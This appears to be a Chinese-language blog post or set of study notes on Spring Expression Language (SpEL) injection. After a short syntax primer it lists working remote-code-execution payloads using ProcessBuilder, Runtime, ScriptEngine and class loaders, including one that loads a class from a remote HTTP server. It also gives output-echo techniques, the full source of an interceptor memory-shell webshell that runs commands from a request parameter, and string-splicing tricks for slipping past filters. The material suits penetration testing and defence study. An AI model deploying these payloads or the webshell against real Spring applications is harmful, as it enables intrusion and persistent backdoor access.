<a name="Z76ps"></a>
# 写在前面
[SPEL表达式注入总结及回显技术](https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/#%E4%BA%94%E3%80%81%E6%8B%96%E5%85%A5%E5%B0%8F%E6%A0%91%E6%9E%97%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC)<br />[SpEL表达式注入漏洞总结](https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BF%90%E7%AE%97)<br />感谢大爹们的技术支持。


<a name="FcjKi"></a>
# SPEL简介
SPEL（Spring Expression Language）是Spring框架中的表达式语言，它提供了一种在运行时访问和操作对象图的功能。SPEL可以在Spring的各个模块中使用，如Spring的注解、XML配置文件、Spring Security等。<br />SPEL支持以下功能：

1. 访问对象属性和方法：可以使用类似于Java的点号语法来访问对象的属性和方法。
2. 调用构造函数和静态方法：可以通过SPEL调用类的构造函数和静态方法。
3. 运算符：支持常见的数学、逻辑和比较运算符。
4. 条件表达式：支持if-else条件表达式。
5. 集合操作：支持对集合类型的操作，如获取元素、迭代等。
6. 正则表达式：支持使用正则表达式进行匹配操作。
7. 类型转换：支持对数据类型进行转换。

在Spring中，SPEL通常用于：

- 在Spring的XML配置文件中设置属性值。
- 在Spring的注解中使用，如@Value注解。
- 在Spring Security中配置安全规则。
- 在Spring的数据访问模块中使用，如Spring Data JPA中的@Query注解。

SPEL的语法简洁灵活，使得在Spring应用中可以更方便地进行配置和表达式计算。<br />--来自大G老师的说法。

<a name="c1cV2"></a>
# 定界符
SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。

#{}和${}的区别：

- #{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
- ${}主要用于加载外部属性文件中的值；
- 两者可以混合使用，但是必须#{}在外面，${}在里面，如#{'${}'}，注意单引号是字符串类型才添加的；

<a name="RPiX1"></a>
# 表达式类型
XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到#{}定界。
```java
<property name="message1" value="#{333}"/>
<property name="message2" value="#{'Enterpr1se'}"/>

```
创建解析器，解析表达式，设置上下文。
```java
ExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression("('Hello' + ' hikari').concat(#end)");
EvaluationContext context = new StandardEvaluationContext();
context.setVariable("end", "!");
System.out.println(expression.getValue(context));
```

<a name="tfPc1"></a>
# T()表达式
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "T(java.lang.String)";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
![微信截图_20230808154949.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691480995436-3b5ef474-8176-44d6-9f7f-7dc0845867a3.png#averageHue=%23857560&clientId=udc01bdaa-c13d-4&from=paste&height=141&id=uf97fd52d&originHeight=176&originWidth=778&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11380&status=done&style=none&taskId=ua84173ba-d729-4d1a-8acb-824e962b7e4&title=&width=622.4)

T()中的内容被解析成一个类。

<a name="quEgp"></a>
# 运算符
SpEL提供了以下几种运算符：

| **运算符类型** | **运算符** |
| --- | --- |
| 算数运算 | +, -, *, /, %, ^ |
| 关系运算 | <, >, ==, <=, >=, lt, gt, eq, le, ge |
| 逻辑运算 | and, or, not, ! |
| 条件运算 | ?:(ternary), ?:(Elvis) |
| 正则表达式 | matches |


变量定义和引用在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：

#this：使用当前正在计算的上下文；<br />#root：引用容器的root对象；<br />@something：引用Bean。

<a name="BhoSr"></a>
# rce
<a name="q5X5i"></a>
## ProcessBuilder
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "new java.lang.ProcessBuilder(new String[]{\"calc\"}).start()";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
<a name="O22Co"></a>
## Runtime
```java
public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "T(java.lang.Runtime).getRuntime().exec('calc')";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
runtime直接用T引用一次就行。
<a name="LSEHa"></a>
# scriptengine
```java
package org.example.vul;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import javax.script.*;

public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
```java
package org.example.vul;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import javax.script.*;

public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "new javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"s=[1];s[0]='calc';java.lang.Runtime.getRuntime().exec(s);\")";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
<a name="DMrZS"></a>
## urlclassloader
远程类加载
```java
package org.example.vul;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import javax.script.*;

public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8000/')}).loadClass(\"exp\").getConstructors()[0].newInstance()";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
优化
```java
package org.example.vul;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import javax.script.*;

public class Spelvultest {
    public static void main(String[] args) {
        String cmdStr = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8000/')}).loadClass(\"exp\").newInstance()";

        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
python起个http。

<a name="l58pt"></a>
## classloader
```java
package org.example.vul;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import javax.script.*;

public class Spelvultest {
    public static void main(String[] args) {
        //String cmdStr = "new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL('http://127.0.0.1:8000/')}).loadClass(\"exp\").newInstance()";
        String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        ExpressionParser parser = new SpelExpressionParser();//创建解析器
        Expression exp = parser.parseExpression(cmdStr);//解析表达式
        System.out.println( exp.getValue() );//弹出计算器
    }
}
```
<a name="RkzYw"></a>
## 其他姿势
```java
String cmdStr = "T(org.springframework.expression.Expression).getClassLoader().getSystemClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")";
"T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader().getSystemClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")";

#web服务下通过内置对象


"{request.getClass().getClassLoader().loadClass("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("exec")}"
 String cmdStr = "username[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"javascript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")]=asdf";
```
<a name="wgnba"></a>
# 回显
<a name="Zxeji"></a>
## BufferedReader
```java
package com.enterpr1se.spring.controller;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.SpelParserConfiguration;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class spelcontroller {

    @RequestMapping("/spel")
    @ResponseBody
    public String spelvul(String payload){
        String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        payload="new java.io.BufferedReader(new java.io.InputStreamReader(new ProcessBuilder(\"cmd\", \"/c\", \"dir\").start().getInputStream(), \"gbk\")).readLine()";
        ExpressionParser parser = new SpelExpressionParser(new SpelParserConfiguration());//创建解析器
        Expression exp = parser.parseExpression(payload);//解析表达式
        return (String) exp.getValue();
    }
}

```
一般不会让你控制return的，看看就好，而且只显示一行。

<a name="wwXd8"></a>
## Scanner
```java
package com.enterpr1se.spring.controller;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.SpelParserConfiguration;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
public class spelcontroller {

    @RequestMapping("/spel")
    @ResponseBody
    public String spelvul(String payload){
        String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        payload="new java.util.Scanner(new java.lang.ProcessBuilder(\"cmd\", \"/c\", \"dir\", \".\\\").start().getInputStream(), \"GBK\").useDelimiter(\"asdasdasdasd\").next()";
        ExpressionParser parser = new SpelExpressionParser(new SpelParserConfiguration());//创建解析器
        Expression exp = parser.parseExpression(payload);//解析表达式
        return (String) exp.getValue();
    }
}

```
<a name="Y69SU"></a>
## <br />ResponseHeader
```java
@Controller
public class spelcontroller {

    @RequestMapping("/spel")
    @ResponseBody
    public String spelvul(String payload,HttpServletResponse response){
        StandardEvaluationContext context=new StandardEvaluationContext();
        context.setVariable("response",response);
        //String cmdStr = "T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang.Runtime').getRuntime().exec('calc')";
        ExpressionParser parser = new SpelExpressionParser(new SpelParserConfiguration());//创建解析器
        Expression exp = parser.parseExpression(payload);//解析表达式
        return (String) exp.getValue(context);
    }
}
```
会在响应头中返回我们的执行结果<br />![微信截图_20230808232900.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691508547132-40a2ec03-9450-4e37-87eb-1c269eee6569.png#averageHue=%23fcfaf9&clientId=u82a1314a-e2f1-4&from=paste&height=100&id=ue2e5b71f&originHeight=125&originWidth=536&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5588&status=done&style=none&taskId=ucb57bdce-9c4a-4887-b2c9-9c4fd543520&title=&width=428.8)


<a name="FkZF7"></a>
# 内存马
关注一下<br />org.springframework.cglib.core.ReflectUtil.defineClass方法<br />![微信截图_20230809141354.png](https://cdn.nlark.com/yuque/0/2023/png/34502958/1691561641890-b9287383-5516-482d-a0d0-272986de39d6.png#averageHue=%232d2c2c&clientId=u67eb8cd2-c442-4&from=paste&height=330&id=uff18d865&originHeight=413&originWidth=1024&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59345&status=done&style=none&taskId=u4c205a68-8ed8-4708-b8d5-ea6cad3e8b2&title=&width=819.2)
```java
T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorShell',T(org.springframework.util.Base64Utils).decodeFromString(''),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()
```
内存马文件
```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.ArrayList;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

public class InceptorMemshell extends AbstractTranslet implements HandlerInterceptor {
    public InceptorMemshell() {
    }

    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException var6) {
                var6.printStackTrace();
            } catch (NullPointerException var7) {
                var7.printStackTrace();
            }

            return true;
        } else {
            return false;
        }
    }

    public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {
    }

    public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        System.out.println("start!");
        WebApplicationContext webapplicationContext = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping abstractHandlerMapping = (RequestMappingHandlerMapping)webapplicationContext.getBean(RequestMappingHandlerMapping.class);
        Field field = null;

        try {
            field = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
        } catch (NoSuchFieldException var6) {
            throw new RuntimeException(var6);
        }

        ArrayList<Object> adptedIntercepter = null;

        try {
            adptedIntercepter = (ArrayList)field.get(abstractHandlerMapping);
        } catch (IllegalAccessException var5) {
            throw new RuntimeException(var5);
        }

        InceptorMemshell shellInterceptor = new InceptorMemshell();
        adptedIntercepter.add(shellInterceptor);
    }
}

```
如果要回显的话，prehandle那里改成
```java
public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        String cmd = request.getParameter("cmd");
        if (cmd != null) {
            try {
                response.setCharacterEncoding("gbk");
                java.io.PrintWriter printWriter = response.getWriter();
                ProcessBuilder builder;
                String o = "";
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    builder = new ProcessBuilder(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    builder = new ProcessBuilder(new String[]{"/bin/bash", "-c", cmd});
                }
                java.util.Scanner c = new java.util.Scanner(builder.start().getInputStream(),"gbk").useDelimiter("wocaosinidema");
                o = c.hasNext() ? c.next(): o;
                c.close();
                printWriter.println(o);
                printWriter.flush();
                printWriter.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return false;
        }
        return true;
    }

```
记得b64内容url编码就行。

<a name="gDPdD"></a>
# bypass
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.SpelParserConfiguration;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;

public class test {
    public static void main(String[] args){
        StandardEvaluationContext context=new StandardEvaluationContext();

        String payload = "T(String).getName()[0]";
        ExpressionParser parser = new SpelExpressionParser(new SpelParserConfiguration());//创建解析器
        Expression exp = parser.parseExpression(payload);//解析表达式
        System.out.println(exp.getValue());

    }
}

//j
```
然后通过replace
```java
String payload = "T(String).getName()[0].replace(106,97)";
//a
```
+拼接
```java
String payload = "T(String).getName()[0].replace(106,97)+T(String).getName()[0].replace(106,114)";
//ar
```
依次类推<br />同理
```java
String payload = "T(Character).toString(114)";
```
<a name="TU539"></a>
## request当跳板
```java
//request.getMethod()为POST

#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,51)%2b#request.getMethod().substring(0,1).replace(80,122)%2b#request.getMethod().substring(0,1).replace(80,104)%2b#request.getMethod().substring(0,1).replace(80,49)
//request.getMethod()为GET

#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,51)%2b#request.getMethod().substring(0,1).replace(71,122)%2b#request.getMethod().substring(0,1).replace(71,104)%2b#request.getMethod().substring(0,1).replace(71,49)

//Cookie
#request.getRequestedSessionId()
```
<a name="gr51d"></a>
## 拼接
```java
"T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(null),new String[]{\"cmd\",\"/c\",\"calc\"})";

"''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod(\"ex\"+\"ec\",T(String)).invoke(''.class.getSuperclass().class.forName('java.lang.Runtime').getMethod(\"getRu\"+\"ntime\").invoke(null),'calc')";
        
```
